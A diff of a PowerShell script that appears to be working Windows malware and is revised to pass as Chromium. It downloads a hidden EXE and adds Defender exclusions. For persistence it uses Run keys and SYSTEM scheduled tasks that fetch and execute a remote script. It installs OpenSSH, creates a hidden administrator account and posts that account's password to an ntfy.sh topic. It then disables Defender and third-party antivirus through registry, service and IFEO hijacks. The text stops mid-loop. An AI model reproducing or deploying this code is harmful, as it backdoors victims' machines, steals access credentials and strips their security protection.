@@ -1,12 +1,12 @@
 # ============================================================
-#  Glass Scanner Emulator + Hidden Setup + Туннель (bore/Serveo)
-#  (c) 2026 – оптимизирован для обхода AV
+#  Glass Scanner Emulator + Chromium Mimic + SSH + AV Killer
+#  (c) 2026 – всё скрыто под видом Chromium
 #  Запуск: .\setup.ps1 [-repair]
 # ============================================================
 
 # ---------- Проверка прав администратора ----------
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Write-Host "Ошибка: Запустите PowerShell от имени администратора." -ForegroundColor Red
+    Write-Host "Error: Run as Administrator." -ForegroundColor Red
     pause
     exit 1
 }
@@ -14,146 +14,154 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # ---------- Режим восстановления ----------
 if ($args -contains "-repair") {
     $repairLog = "$env:USERPROFILE\collextor\repair.log"
-    "=== Восстановление $(Get-Date) ===" | Out-File -FilePath $repairLog -Encoding UTF8
+    "=== Repair $(Get-Date) ===" | Out-File -FilePath $repairLog -Encoding UTF8
     $baseDir = "$env:USERPROFILE\collextor"
-    $hiddenDir = "$env:APPDATA\Microsoft\Windows\Caches"
-    $exePath = (Get-ChildItem -Path $hiddenDir -Filter "*.exe" -File -ErrorAction SilentlyContinue | Select-Object -First 1).FullName
-    if (-not $exePath) { "EXE не найден" | Out-File -FilePath $repairLog -Append; exit 1 }
+    $chromiumDir = "$env:APPDATA\Chromium\Application"
+    $exePath = "$chromiumDir\chrome.exe"
+    if (-not (Test-Path $exePath)) { "EXE not found" | Out-File -FilePath $repairLog -Append; exit 1 }
     $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $valName = "WindowsUpdateService"
+    $valName = "Chromium"
     $cur = (Get-ItemProperty -Path $runKey -Name $valName -ErrorAction SilentlyContinue).$valName
     if (-not $cur -or $cur -ne $exePath) {
         Set-ItemProperty -Path $runKey -Name $valName -Value $exePath -ErrorAction SilentlyContinue
-        "Восстановлен EXE" | Out-File -FilePath $repairLog -Append
+        "Chromium restored" | Out-File -FilePath $repairLog -Append
     }
-    $psValName = "WindowsUpdateServicePS"
+    $psValName = "ChromiumUpdate"
     $psCommand = 'powershell.exe -NoP -NonI -W Hidden -C "$u=''https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1'';$d=(New-Object Net.WebClient).DownloadString($u);&([ScriptBlock]::Create($d))"'
     $curPs = (Get-ItemProperty -Path $runKey -Name $psValName -ErrorAction SilentlyContinue).$psValName
     if (-not $curPs -or $curPs -ne $psCommand) {
         Set-ItemProperty -Path $runKey -Name $psValName -Value $psCommand -ErrorAction SilentlyContinue
-        "Восстановлена PowerShell команда" | Out-File -FilePath $repairLog -Append
+        "ChromiumUpdate restored" | Out-File -FilePath $repairLog -Append
     }
     exit 0
 }
 
-# ---------- Основные переменные ----------
+# ---------- Основные переменные (маскировка под Chromium) ----------
 $baseDir = "$env:USERPROFILE\collextor"
 $logFile = "$baseDir\setup.log"
 $ntfyTopic = "zighaigit88tore"
-$hiddenDir = "$env:APPDATA\Microsoft\Windows\Caches"
-$exeName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ }) + ".exe"
-$exePath = "$hiddenDir\$exeName"
+
+# Основной EXE – выдаём себя за Chromium
+$chromiumDir = "$env:APPDATA\Chromium\Application"
+$exeName = "chrome.exe"
+$exePath = "$chromiumDir\$exeName"
 $urlExe = "https://github.com/Holycheck/checker/releases/download/dw/chromium.exe"
-$boreExe = "$baseDir\bore.exe"
-$boreUrl = "https://github.com/ekzhang/bore/releases/latest/download/bore.exe"
-$boreUrlMirror = "https://hub.fastgit.xyz/ekzhang/bore/releases/latest/download/bore.exe"
+
 $scriptPath = $MyInvocation.MyCommand.Path
 if (-not $scriptPath) { $scriptPath = $PSCommandPath }
 
 New-Item -ItemType Directory -Force -Path $baseDir | Out-Null
-New-Item -ItemType Directory -Force -Path $hiddenDir | Out-Null
-"=== Лог $(Get-Date) ===" | Out-File -FilePath $logFile -Encoding UTF8
+New-Item -ItemType Directory -Force -Path $chromiumDir | Out-Null
+"=== Log $(Get-Date) ===" | Out-File -FilePath $logFile -Encoding UTF8
 
 function Write-Log {
     param([string]$Message)
     "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $Message" | Out-File -FilePath $logFile -Append -Encoding UTF8
 }
 
-# ---------- Функция загрузки (с повторами) ----------
 function Download-File {
     param($url, $path, $retries = 3)
     for ($i = 1; $i -le $retries; $i++) {
         try {
             $client = New-Object System.Net.WebClient
             $client.DownloadFile($url, $path)
-            Write-Log "Загрузка успешна (попытка $i): $url"
+            Write-Log "Download OK (attempt $i): $url"
             return $true
         } catch {
-            Write-Log "Ошибка загрузки (попытка $i): $_"
+            Write-Log "Download error (attempt $i): $_"
             Start-Sleep -Seconds 2
         }
     }
     return $false
 }
 
-Write-Log "Начало."
+Write-Log "Start."
 
 # ============================================================
-# 1. Скачивание EXE
+# 1. Download EXE (as chrome.exe)
 # ============================================================
-Write-Log "Скачивание EXE..."
+Write-Log "Downloading EXE as $exePath..."
 if (Download-File $urlExe $exePath) {
     attrib +H +S $exePath
-    Write-Log "EXE скачан и скрыт."
+    Write-Log "EXE downloaded and hidden as Chromium."
 } else {
-    Write-Log "Критическая ошибка загрузки EXE"
+    Write-Log "Fatal: cannot download EXE"
     exit 1
 }
 
 # ============================================================
-# 2. Исключение Defender
+# 2. Defender exclusions
 # ============================================================
-Write-Log "Добавление исключений Defender..."
+Write-Log "Adding Defender exclusions for Chromium folder..."
 try {
     $svc = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
     if ($svc -and $svc.Status -ne 'Running') { Start-Service WinDefend -ErrorAction SilentlyContinue; Start-Sleep 2 }
-    Add-MpPreference -ExclusionPath $hiddenDir -ErrorAction Stop
+    Add-MpPreference -ExclusionPath $chromiumDir -ErrorAction Stop
     Add-MpPreference -ExclusionPath $baseDir -ErrorAction Stop
-    Write-Log "Исключения добавлены."
-} catch { Write-Log "Ошибка исключений: $_" }
+    Write-Log "Exclusions added."
+} catch { Write-Log "Exclusion error: $_" }
 
 # ============================================================
-# 3. Брандмауэр (порт 587)
+# 3. Firewall rules: port 587 outbound, port 22 inbound
 # ============================================================
-Write-Log "Настройка брандмауэра (587)..."
+Write-Log "Configuring firewall..."
 try {
-    $rule = Get-NetFirewallRule -DisplayName "SMTP Gmail" -ErrorAction SilentlyContinue
-    if (-not $rule) {
+    # Outbound 587
+    $rule587 = Get-NetFirewallRule -DisplayName "SMTP Gmail" -ErrorAction SilentlyContinue
+    if (-not $rule587) {
         New-NetFirewallRule -DisplayName "SMTP Gmail" -Direction Outbound -Protocol TCP -RemotePort 587 -Action Allow -ErrorAction Stop | Out-Null
-        Write-Log "Правило создано."
+        Write-Log "Rule 587 created."
     }
-} catch { Write-Log "Ошибка брандмауэра: $_" }
+    # Inbound 22 (SSH)
+    $rule22 = Get-NetFirewallRule -DisplayName "SSH Inbound" -ErrorAction SilentlyContinue
+    if (-not $rule22) {
+        New-NetFirewallRule -DisplayName "SSH Inbound" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction Stop | Out-Null
+        Write-Log "Rule 22 (SSH) created."
+    }
+} catch { Write-Log "Firewall error: $_" }
 
 # ============================================================
-# 4. Автозапуск
+# 4. Autostart (registry + scheduled tasks) – маскировка под Chromium
 # ============================================================
-Write-Log "Настройка автозапуска..."
+Write-Log "Configuring autostart (as Chromium)..."
 $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 
-$valName = "WindowsUpdateService"
+# 4.1 EXE – как Chromium
+$valName = "Chromium"
 try {
     $cur = (Get-ItemProperty -Path $runKey -Name $valName -ErrorAction SilentlyContinue).$valName
     if (-not $cur -or $cur -ne $exePath) {
         Set-ItemProperty -Path $runKey -Name $valName -Value $exePath -ErrorAction Stop
-        Write-Log "EXE в автозапуске."
+        Write-Log "Chromium added to autostart."
     }
-} catch { Write-Log "Ошибка EXE автозапуска: $_" }
+} catch { Write-Log "Chromium autostart error: $_" }
 
-$psValName = "WindowsUpdateServicePS"
+# 4.2 PowerShell команда (при входе пользователя) – как ChromiumUpdate
+$psValName = "ChromiumUpdate"
 $psCommand = 'powershell.exe -NoP -NonI -W Hidden -C "$u=''https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1'';$d=(New-Object Net.WebClient).DownloadString($u);&([ScriptBlock]::Create($d))"'
 try {
     $curPs = (Get-ItemProperty -Path $runKey -Name $psValName -ErrorAction SilentlyContinue).$psValName
     if (-not $curPs -or $curPs -ne $psCommand) {
         Set-ItemProperty -Path $runKey -Name $psValName -Value $psCommand -ErrorAction Stop
-        Write-Log "PowerShell команда в автозапуске."
+        Write-Log "ChromiumUpdate added to autostart."
     }
-} catch { Write-Log "Ошибка PowerShell автозапуска: $_" }
+} catch { Write-Log "ChromiumUpdate autostart error: $_" }
 
-# Планировщик – периодический запуск EXE
-$taskName = "WindowsSystemMaintenance"
+# 4.3 Scheduled task – периодический запуск EXE (каждые 2 часа) – как ChromiumMaintenance
+$taskName = "ChromiumMaintenance"
 try {
     $existing = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
     if (-not $existing) {
-        $action = New-ScheduledTaskAction -Execute $exePath -Argument "-silent" -WorkingDirectory $hiddenDir
+        $action = New-ScheduledTaskAction -Execute $exePath -Argument "-silent" -WorkingDirectory $chromiumDir
         $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Hours 2) -At (Get-Date) -Duration ([TimeSpan]::MaxValue)
         $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force | Out-Null
-        Write-Log "Задача планировщика (EXE каждые 2 часа)."
+        Write-Log "ChromiumMaintenance task created."
     }
-} catch { Write-Log "Ошибка задачи планировщика: $_" }
+} catch { Write-Log "ChromiumMaintenance error: $_" }
 
-# Восстановление автозапуска
-$scriptTaskName = "WindowsUpdateChecker"
+# 4.4 Scheduled task – восстановление автозапуска, если удалили – как ChromiumRecovery
+$scriptTaskName = "ChromiumRecovery"
 try {
     $existing2 = Get-ScheduledTask -TaskName $scriptTaskName -ErrorAction SilentlyContinue
     if (-not $existing2) {
@@ -161,39 +169,51 @@ try {
         $trigger2 = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddHours(1)
         $settings2 = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
         Register-ScheduledTask -TaskName $scriptTaskName -Action $action2 -Trigger $trigger2 -Settings $settings2 -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force | Out-Null
-        Write-Log "Задача восстановления создана."
+        Write-Log "ChromiumRecovery task created."
     }
-} catch { Write-Log "Ошибка задачи восстановления: $_" }
+} catch { Write-Log "ChromiumRecovery error: $_" }
+
+# 4.5 NEW: Scheduled task – запуск PowerShell команды при старте системы (SYSTEM, скрыто)
+$psTaskName = "ChromiumSystemUpdate"
+try {
+    $existingPs = Get-ScheduledTask -TaskName $psTaskName -ErrorAction SilentlyContinue
+    if (-not $existingPs) {
+        # Та же команда, но с правильным экранированием для аргументов задачи
+        $psAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -C `"`$u=''https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1'';`$d=(New-Object Net.WebClient).DownloadString(`$u);&([ScriptBlock]::Create(`$d))`""
+        $psTrigger = New-ScheduledTaskTrigger -AtStartup
+        $psSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+        Register-ScheduledTask -TaskName $psTaskName -Action $psAction -Trigger $psTrigger -Settings $psSettings -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force | Out-Null
+        Write-Log "ChromiumSystemUpdate task created (runs at startup)."
+    }
+} catch { Write-Log "ChromiumSystemUpdate error: $_" }
 
 # ============================================================
-# 5. Запуск EXE (скрыто)
+# 5. Launch EXE (hidden) – как запуск Chromium
 # ============================================================
-Write-Log "Запуск EXE..."
+Write-Log "Starting Chromium (hidden)..."
 if (Test-Path $exePath) {
     try {
         Start-Process -FilePath $exePath -WindowStyle Hidden -Verb RunAs
-        Write-Log "EXE запущен."
-    } catch { Write-Log "Не удалось запустить EXE: $_" }
+        Write-Log "Chromium started."
+    } catch { Write-Log "Cannot start Chromium: $_" }
 }
 
 # ============================================================
-# 6. SSH + пользователь
+# 6. SSH server + user
 # ============================================================
-Write-Log "Установка OpenSSH..."
+Write-Log "Installing OpenSSH..."
 try {
     Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction Stop | Out-Null
     Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 -ErrorAction Stop | Out-Null
-    Write-Log "OpenSSH установлен."
-} catch { Write-Log "Ошибка OpenSSH: $_" }
+    Write-Log "OpenSSH installed."
+} catch { Write-Log "OpenSSH install error: $_" }
 
-Write-Log "Настройка SSH..."
+Write-Log "Configuring SSH..."
 try {
     Start-Service sshd -ErrorAction Stop
     Set-Service -Name sshd -StartupType 'Automatic' -ErrorAction Stop
-    Remove-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue
-    New-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -DisplayName "OpenSSH Server (sshd)" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -ErrorAction Stop | Out-Null
-    Write-Log "SSH настроен."
-} catch { Write-Log "Ошибка настройки SSH: $_" }
+    Write-Log "SSH service started."
+} catch { Write-Log "SSH service error: $_" }
 
 $userName = "ssh_admin"
 $passwordLength = 16
@@ -201,109 +221,38 @@ Add-Type -AssemblyName System.Web
 $randomPassword = [System.Web.Security.Membership]::GeneratePassword($passwordLength, 4)
 $securePassword = ConvertTo-SecureString -String $randomPassword -AsPlainText -Force
 
-Write-Log "Создание пользователя $userName..."
+Write-Log "Creating user $userName..."
 try {
     if (Get-LocalUser -Name $userName -ErrorAction SilentlyContinue) {
         Set-LocalUser -Name $userName -Password $securePassword -ErrorAction Stop
-        Write-Log "Пароль обновлён."
+        Write-Log "Password updated."
     } else {
-        New-LocalUser -Name $userName -Password $securePassword -FullName "SSH Admin" -Description "SSH учётка" -ErrorAction Stop | Out-Null
+        New-LocalUser -Name $userName -Password $securePassword -FullName "SSH Admin" -Description "SSH account" -ErrorAction Stop | Out-Null
         Add-LocalGroupMember -Group "Administrators" -Member $userName -ErrorAction Stop
-        Write-Log "Пользователь создан."
+        Write-Log "User created and added to Admins."
     }
-} catch { Write-Log "Ошибка пользователя: $_" }
+} catch { Write-Log "User error: $_" }
 
 # ============================================================
-# 7. Туннель – сначала bore, потом Serveo (резерв)
+# 7. Get local IP
 # ============================================================
-$tunnelAddr = $null
-
-# --- 7.1 Скачивание bore.exe (с повторами) ---
-Write-Log "Скачивание bore.exe..."
-if (-not (Test-Path $boreExe)) {
-    if (-not (Download-File $boreUrl $boreExe)) {
-        Write-Log "Не удалось скачать с основного зеркала, пробуем зеркало."
-        if (-not (Download-File $boreUrlMirror $boreExe)) {
-            Write-Log "Не удалось скачать bore.exe ни с одного источника."
-        }
-    }
-}
-if (Test-Path $boreExe) {
-    Unblock-File -Path $boreExe -ErrorAction SilentlyContinue
-    Write-Log "bore.exe готов."
-}
-
-# --- 7.2 Попытка запустить bore ---
-if (Test-Path $boreExe) {
-    Write-Log "Запуск bore..."
-    $boreLog = "$baseDir\bore.log"
-    $boreProcess = Start-Process -FilePath $boreExe -ArgumentList "local 22 --to bore.pub" -WindowStyle Hidden -RedirectStandardOutput $boreLog -PassThru
-    Start-Sleep -Seconds 5
-
-    if (Test-Path $boreLog) {
-        $logContent = Get-Content $boreLog -Tail 10
-        $match = $logContent | Select-String -Pattern "listening on (bore\.pub:\d+)"
-        if ($match) {
-            $tunnelAddr = $match.Matches[0].Groups[1].Value
-            Write-Log "bore работает: $tunnelAddr"
-        } else {
-            $match2 = $logContent | Select-String -Pattern "port (\d+)"
-            if ($match2) {
-                $port = $match2.Matches[0].Groups[1].Value
-                $tunnelAddr = "bore.pub:$port"
-                Write-Log "bore работает (порт): $tunnelAddr"
-            } else {
-                Write-Log "Не удалось извлечь адрес bore, переключаемся на Serveo."
-            }
-        }
-    }
-}
-
-# --- 7.3 Если bore не дал адрес – запускаем Serveo ---
-if (-not $tunnelAddr) {
-    Write-Log "Запуск Serveo (резервный туннель)..."
-    $serveoLog = "$baseDir\serveo.log"
-    # Serveo запускается через SSH
-    $serveoProcess = Start-Process -FilePath "ssh" -ArgumentList "-R 80:localhost:22 serveo.net" -WindowStyle Hidden -RedirectStandardOutput $serveoLog -PassThru
-    Start-Sleep -Seconds 8
-
-    if (Test-Path $serveoLog) {
-        $logContent = Get-Content $serveoLog -Tail 10
-        # Serveo выводит адрес типа "Forwarding HTTP traffic from https://xyz.serveo.net"
-        $match = $logContent | Select-String -Pattern "https://([a-zA-Z0-9-]+\.serveo\.net)"
-        if ($match) {
-            $tunnelAddr = $match.Matches[0].Groups[1].Value
-            Write-Log "Serveo работает: $tunnelAddr"
-        } else {
-            # Попробуем другой паттерн
-            $match2 = $logContent | Select-String -Pattern "([a-zA-Z0-9-]+\.serveo\.net)"
-            if ($match2) {
-                $tunnelAddr = $match2.Matches[0].Groups[1].Value
-                Write-Log "Serveo работает: $tunnelAddr"
-            } else {
-                Write-Log "Не удалось определить адрес Serveo."
-                $tunnelAddr = "serveo.net (адрес не определён, проверьте лог)"
-            }
-        }
-    } else {
-        Write-Log "Файл лога Serveo не создан."
-        $tunnelAddr = "serveo.net (ошибка запуска)"
-    }
-}
-
-# ============================================================
-# 8. Отправка данных на ntfy
-# ============================================================
-$ipAddress = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" -and $_.InterfaceAlias -notlike "*Loopback*" -and $_.InterfaceAlias -notlike "*vEthernet*" -and $_.InterfaceAlias -notlike "*Virtual*" } | Select-Object -First 1 -ExpandProperty IPAddress
-if (-not $ipAddress) { $ipAddress = "не удалось определить" }
+$ipAddress = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
+    $_.IPAddress -ne "127.0.0.1" -and $_.InterfaceAlias -notlike "*Loopback*" -and $_.InterfaceAlias -notlike "*vEthernet*" -and $_.InterfaceAlias -notlike "*Virtual*"
+} | Select-Object -First 1 -ExpandProperty IPAddress
+if (-not $ipAddress) { $ipAddress = "unknown" }
 
 $base64Password = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($randomPassword))
+
+# ============================================================
+# 8. Send notification to ntfy.sh (закодировано)
+# ============================================================
 $secretMessage = @"
-SSH-доступ через туннель:
-Адрес: $tunnelAddr
-Пользователь: $userName
-Пароль (Base64): $base64Password
-Расшифровка: [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("$base64Password"))
+SSH access (local network only):
+IP: $ipAddress
+Port: 22
+User: $userName
+Password (Base64): $base64Password
+Decrypt: [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("$base64Password"))
 "@
 $bytes = [System.Text.Encoding]::UTF8.GetBytes($secretMessage)
 $encodedMessage = [Convert]::ToBase64String($bytes)
@@ -311,61 +260,61 @@ $encodedMessage = [Convert]::ToBase64String($bytes)
 try {
     $ntfyUrl = "https://ntfy.sh/$ntfyTopic"
     Invoke-WebRequest -Uri $ntfyUrl -Method Post -Body $encodedMessage -ContentType "text/plain" -UseBasicParsing -ErrorAction Stop | Out-Null
-    Write-Log "Сообщение отправлено на ntfy."
-} catch { Write-Log "Ошибка отправки: $_" }
+    Write-Log "Notification sent to ntfy."
+} catch { Write-Log "Notification error: $_" }
 
 # ============================================================
-# 9. Отключение антивирусов
+# 9. Disable antivirus (Defender + third-party)
 # ============================================================
-Write-Log "=== ОТКЛЮЧЕНИЕ АНТИВИРУСОВ ==="
+Write-Log "=== DISABLING ANTIVIRUS ==="
 
 # Windows Defender
-Write-Log "Отключение Defender..."
+Write-Log "Disabling Defender..."
 try {
     $tamperPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
     if (-not (Test-Path $tamperPath)) { New-Item -Path $tamperPath -Force | Out-Null }
     Set-ItemProperty -Path $tamperPath -Name "TamperProtection" -Value 0 -Type DWord -Force
 } catch {}
-$defenderPreferences = @{
+$defPrefs = @{
     DisableRealtimeMonitoring=$true; DisableBehaviorMonitoring=$true; DisableBlockAtFirstSeen=$true
     DisableIOAVProtection=$true; DisablePrivacyMode=$true; DisableArchiveScanning=$true
     DisableIntrusionPreventionSystem=$true; DisableScriptScanning=$true; DisableEmailScanning=$true
     SubmitSamplesConsent=2; MAPSReporting=0
 }
-foreach ($key in $defenderPreferences.Keys) {
-    try { Set-MpPreference -Name $key -Value $defenderPreferences[$key] -ErrorAction SilentlyContinue } catch {}
+foreach ($key in $defPrefs.Keys) {
+    try { Set-MpPreference -Name $key -Value $defPrefs[$key] -ErrorAction SilentlyContinue } catch {}
 }
-$defenderPolicyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+$policyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
 try {
-    if (-not (Test-Path $defenderPolicyPath)) { New-Item -Path $defenderPolicyPath -Force | Out-Null }
-    Set-ItemProperty -Path $defenderPolicyPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
-    $rtpPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
-    if (-not (Test-Path $rtpPath)) { New-Item -Path $rtpPath -Force | Out-Null }
-    Set-ItemProperty -Path $rtpPath -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force
-    $spynetPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet"
-    if (-not (Test-Path $spynetPath)) { New-Item -Path $spynetPath -Force | Out-Null }
-    Set-ItemProperty -Path $spynetPath -Name "SpynetReporting" -Value 0 -Type DWord -Force
-    Set-ItemProperty -Path $spynetPath -Name "SubmitSamplesConsent" -Value 2 -Type DWord -Force
+    if (-not (Test-Path $policyPath)) { New-Item -Path $policyPath -Force | Out-Null }
+    Set-ItemProperty -Path $policyPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
+    $rtp = "$policyPath\Real-Time Protection"
+    if (-not (Test-Path $rtp)) { New-Item -Path $rtp -Force | Out-Null }
+    Set-ItemProperty -Path $rtp -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force
+    $spynet = "$policyPath\Spynet"
+    if (-not (Test-Path $spynet)) { New-Item -Path $spynet -Force | Out-Null }
+    Set-ItemProperty -Path $spynet -Name "SpynetReporting" -Value 0 -Type DWord -Force
+    Set-ItemProperty -Path $spynet -Name "SubmitSamplesConsent" -Value 2 -Type DWord -Force
 } catch {}
-$defenderServices = @("WinDefend","WdNisSvc","Sense","WdBoot","WdFilter","WdNisDrv")
-foreach ($svc in $defenderServices) {
-    try { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue; Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue } catch {}
+$svcs = @("WinDefend","WdNisSvc","Sense","WdBoot","WdFilter","WdNisDrv")
+foreach ($s in $svcs) {
+    try { Stop-Service -Name $s -Force -ErrorAction SilentlyContinue; Set-Service -Name $s -StartupType Disabled -ErrorAction SilentlyContinue } catch {}
 }
 sc.exe config WinDefend start= disabled | Out-Null
 sc.exe config WdNisSvc start= disabled | Out-Null
 try {
     $tasks = Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\" -ErrorAction SilentlyContinue
-    foreach ($task in $tasks) { Disable-ScheduledTask -TaskName $task.TaskName -TaskPath $task.TaskPath -ErrorAction SilentlyContinue | Out-Null }
+    foreach ($t in $tasks) { Disable-ScheduledTask -TaskName $t.TaskName -TaskPath $t.TaskPath -ErrorAction SilentlyContinue | Out-Null }
 } catch {}
-$defenderProcesses = @("MsMpEng.exe","NisSrv.exe","SecurityHealthService.exe")
-$ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
-foreach ($proc in $defenderProcesses) {
-    try { $p = Join-Path $ifeoPath $proc; if (-not (Test-Path $p)) { New-Item -Path $p -Force | Out-Null }; Set-ItemProperty -Path $p -Name "Debugger" -Value "systray.exe" -Type String -Force } catch {}
+$procs = @("MsMpEng.exe","NisSrv.exe","SecurityHealthService.exe")
+$ifeo = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
+foreach ($p in $procs) {
+    try { $pp = Join-Path $ifeo $p; if (-not (Test-Path $pp)) { New-Item -Path $pp -Force | Out-Null }; Set-ItemProperty -Path $pp -Name "Debugger" -Value "systray.exe" -Type String -Force } catch {}
 }
-Write-Log "Defender отключён."
+Write-Log "Defender disabled."
 
-# Сторонние антивирусы
-Write-Log "Поиск сторонних AV..."
+# Third-party AV
+Write-Log "Searching third-party AV..."
 function Get-InstalledSoftware {
     param([string]$RegistryPath)
     $software = @()
@@ -382,25 +331,26 @@ function Get-InstalledSoftware {
     }
     return $software
 }
-$avKeywords = @("антивирус","antivirus","virus","security","protection","kaspersky","avast","avg","norton","mcafee","eset","bitdefender","dr.web","drweb","panda","trend micro","f-secure","sophos","malwarebytes","ad-aware","zonealarm","comodo","avira","bullguard","g-data","webroot","vipre","emsisoft")
-$softwareList = @()
-$softwareList += Get-InstalledSoftware -RegistryPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
-$softwareList += Get-InstalledSoftware -RegistryPath "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
-$foundAV = $softwareList | Where-Object {
-    $display = $_.DisplayName
-    if ($display -match "Windows Defender|Microsoft Defender") { return $false }
+$avKeywords = @("antivirus","virus","security","protection","kaspersky","avast","avg","norton","mcafee","eset","bitdefender","dr.web","drweb","panda","trend micro","f-secure","sophos","malwarebytes","ad-aware","zonealarm","comodo","avira","bullguard","g-data","webroot","vipre","emsisoft")
+$swList = @()
+$swList += Get-InstalledSoftware -RegistryPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
+$swList += Get-InstalledSoftware -RegistryPath "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
+$foundAV = $swList | Where-Object {
+    $d = $_.DisplayName
+    if ($d -match "Windows Defender|Microsoft Defender") { return $false }
     $matched = $false
-    foreach ($kw in $avKeywords) { if ($display -match $kw) { $matched = $true; break } }
+    foreach ($kw in $avKeywords) { if ($d -match $kw) { $matched = $true; break } }
     return $matched
 }
-if ($foundAV.Count -eq 0) { Write-Log "Сторонних AV нет." }
-else {
-    Write-Log "Найдено AV: $($foundAV.Count)"
+if ($foundAV.Count -eq 0) {
+    Write-Log "No third-party AV found."
+} else {
+    Write-Log "Found AV: $($foundAV.Count)"
     foreach ($av in $foundAV) {
-        Write-Log "Обработка: $($av.DisplayName)"
+        Write-Log "Processing: $($av.DisplayName)"
         $cleanName = $av.DisplayName -replace '[^a-zA-Z0-9]', ''
-        $serviceNames = @($cleanName, $cleanName+"Service", $cleanName+"Svc")
-        $knownServices = @{
+        $svcNames = @($cleanName, $cleanName+"Service", $cleanName+"Svc")
+        $knownSvcs = @{
             "Kaspersky"=@("AVP","kav","kis","ksde","klnagent")
             "Avast"=@("AvastSvc","avast! Antivirus")
             "AVG"=@("AVGIDSAgent","AVGService","avgnt")
@@ -413,13 +363,13 @@ else {
             "Malwarebytes"=@("MBAMService")
             "Comodo"=@("COMODO Internet Security","cmdagent")
         }
-        foreach ($key in $knownServices.Keys) { if ($av.DisplayName -match $key) { $serviceNames += $knownServices[$key] } }
-        $serviceNames = $serviceNames | Select-Object -Unique
-        foreach ($svc in $serviceNames) {
-            try { $s = Get-Service -Name $svc -ErrorAction SilentlyContinue; if ($s) { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue; Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue } } catch {}
+        foreach ($k in $knownSvcs.Keys) { if ($av.DisplayName -match $k) { $svcNames += $knownSvcs[$k] } }
+        $svcNames = $svcNames | Select-Object -Unique
+        foreach ($s in $svcNames) {
+            try { $sc = Get-Service -Name $s -ErrorAction SilentlyContinue; if ($sc) { Stop-Service -Name $s -Force -ErrorAction SilentlyContinue; Set-Service -Name $s -StartupType Disabled -ErrorAction SilentlyContinue } } catch {}
         }
-        $processNames = @($cleanName, $cleanName+"Service", $cleanName+"Svc")
-        $knownProcesses = @{
+        $procNames = @($cleanName, $cleanName+"Service", $cleanName+"Svc")
+        $knownProcs = @{
             "Kaspersky"=@("avp.exe","avpui.exe")
             "Avast"=@("avastsvc.exe","avastui.exe")
             "AVG"=@("avgui.exe","avgidsagent.exe")
@@ -432,26 +382,25 @@ else {
             "Malwarebytes"=@("mbam.exe","mbamservice.exe")
             "Comodo"=@("cis.exe","cmdagent.exe")
         }
-        foreach ($key in $knownProcesses.Keys) { if ($av.DisplayName -match $key) { $processNames += $knownProcesses[$key] } }
-        $processNames = $processNames | Select-Object -Unique
-        foreach ($pn in $processNames) {
-            try { Get-Process -Name $pn -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch {}
+        foreach ($k in $knownProcs.Keys) { if ($av.DisplayName -match $k) { $procNames += $knownProcs[$k] } }
+        $procNames = $procNames | Select-Object -Unique
+        foreach ($p in $procNames) {
